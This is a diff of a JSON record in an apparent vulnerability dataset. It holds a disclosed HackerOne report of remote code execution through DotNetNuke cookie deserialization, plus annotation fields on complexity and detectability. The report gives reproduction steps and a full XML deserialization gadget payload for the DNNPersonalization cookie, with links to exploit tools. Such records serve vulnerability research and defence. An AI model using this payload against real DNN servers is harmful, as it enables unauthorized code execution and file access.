@@ -1,49 +1,50 @@
 {
-    "reported_to": "U.S. Dept Of Defense",
-    "reported_by": "droop3r ",
-    "title": "Remote Code Execution through DNN Cookie Deserialization ",
-    "content": "\nSummary:\nThe application at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 presents a deserialization vulnerability that permits RCE and file read/write\nStep-by-step Reproduction Instructions\nNavigate to a random page that must return a 404 Error status like https://\u2588\u2588\u2588\u2588/test\nAdd this cookie in the request header: DNNPersonalization\nInsert the payload into the DNNPersonalization cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:\nCode 806 Bytes\n1<profile>\n2<item key=\"name1:key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n3<ExpandedElement/>\n4<ProjectedProperty0>\n5<MethodName>WriteFile</MethodName>\n6<MethodParameters>\n7<anyType xsi:type=\"xsd:string\">test</anyType>\n8</MethodParameters>\n9<ObjectInstance xsi:type=\"FileSystemUtils\"></ObjectInstance>\n10</ProjectedProperty0>\n11</ExpandedWrapperOfFileSystemUtilsObjectDataProvider>\n12</item>\n13</profile>\nWhere test is the wanted file\nExpected result:\n\u2588\u2588\u2588\u2588\nProduct, Version, and Configuration (If applicable)\nPlatform: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/shell.aspx\nVulnerable Product: DotNetNuke\nVulnerable Version: < 9.3.0-RC\nSuggested Mitigation/Remediation Actions\nUpdate the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable\nImpact\nAn attacker can execute remote commands on the system and gain unauthorized access to it.\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "droop3r ",
+  "title": "Remote Code Execution through DNN Cookie Deserialization ",
+  "content": "\nSummary:\nThe application at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 presents a deserialization vulnerability that permits RCE and file read/write\nStep-by-step Reproduction Instructions\nNavigate to a random page that must return a 404 Error status like https://\u2588\u2588\u2588\u2588/test\nAdd this cookie in the request header: DNNPersonalization\nInsert the payload into the DNNPersonalization cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:\nCode 806 Bytes\n1<profile>\n2<item key=\"name1:key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n3<ExpandedElement/>\n4<ProjectedProperty0>\n5<MethodName>WriteFile</MethodName>\n6<MethodParameters>\n7<anyType xsi:type=\"xsd:string\">test</anyType>\n8</MethodParameters>\n9<ObjectInstance xsi:type=\"FileSystemUtils\"></ObjectInstance>\n10</ProjectedProperty0>\n11</ExpandedWrapperOfFileSystemUtilsObjectDataProvider>\n12</item>\n13</profile>\nWhere test is the wanted file\nExpected result:\n\u2588\u2588\u2588\u2588\nProduct, Version, and Configuration (If applicable)\nPlatform: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/shell.aspx\nVulnerable Product: DotNetNuke\nVulnerable Version: < 9.3.0-RC\nSuggested Mitigation/Remediation Actions\nUpdate the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable\nImpact\nAn attacker can execute remote commands on the system and gain unauthorized access to it.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "OS Command Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1590602760,
+  "report_url": "https://hackerone.com/reports/876708",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Navigate to a random page that returns a 404 Error status (e.g., https://\u2588\u2588\u2588\u2588/test)"
     ],
-    "bounty": null,
-    "weaknesses": [
-        "OS Command Injection"
+    [
+      2,
+      "Add the 'DNNPersonalization' cookie to the request header with a malicious payload (generated using tools like ysoserial.net or the exploit from Exploit-DB)"
     ],
-    "screenshots": {},
-    "disclosed_date": 1590602760,
-    "report_url": "https://hackerone.com/reports/876708",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Navigate to a random page that returns a 404 Error status (e.g., https://\u2588\u2588\u2588\u2588/test)"
-        ],
-        [
-            2,
-            "Add the 'DNNPersonalization' cookie to the request header with a malicious payload (generated using tools like ysoserial.net or the exploit from Exploit-DB)"
-        ],
-        [
-            3,
-            "Send the request to trigger deserialization of the malicious payload"
-        ]
-    ],
-    "vuln_description": "The vulnerability is a deserialization flaw in DotNetNuke (DNN) that allows remote code execution (RCE) and file read/write operations via the 'DNNPersonalization' cookie. Attackers can craft a malicious payload to exploit this vulnerability.",
-    "reason": "The attack involves understanding deserialization vulnerabilities, crafting a specific payload for DNN, and manipulating the cookie header. While the steps are straightforward, the payload construction requires knowledge of DNN's internals and deserialization exploits.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "reason": "The vulnerability involves deserialization of a cookie (DNNPersonalization) to achieve RCE, which is not related to authentication or authorization bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, not on detecting deserialization vulnerabilities.",
-        "is_detectable": false
-    }
+    [
+      3,
+      "Send the request to trigger deserialization of the malicious payload"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a deserialization flaw in DotNetNuke (DNN) that allows remote code execution (RCE) and file read/write operations via the 'DNNPersonalization' cookie. Attackers can craft a malicious payload to exploit this vulnerability.",
+  "reason": "The attack involves understanding deserialization vulnerabilities, crafting a specific payload for DNN, and manipulating the cookie header. While the steps are straightforward, the payload construction requires knowledge of DNN's internals and deserialization exploits.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "reasoning": "The vulnerability relies on deserializing a crafted payload in the DNNPersonalization cookie. The methodology's 'simple payload' approach would likely miss this because:\n1. The exploit requires a highly specific XML structure leveraging internal DNN classes (e.g., ExpandedWrapper, ObjectDataProvider), which are not part of generic payload lists\n2. Detection of RCE/file operations wouldn't be directly observable through same-channel responses without prior knowledge of the vulnerability\n3. Cookie parameters might not be flagged as injectable without specific framework-aware analysis",
+    "is_simple_injection": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a deserialization flaw in the DNN cookie, which is not directly related to authentication or authorization boundaries being crossed by swapping user sessions or resource IDs. The methodology described focuses on AuthN/AuthZ bypasses and IDORs by manipulating user sessions and resource IDs, whereas this vulnerability exploits insecure deserialization to achieve RCE.",
+    "is_detectable": false
+  }
 }
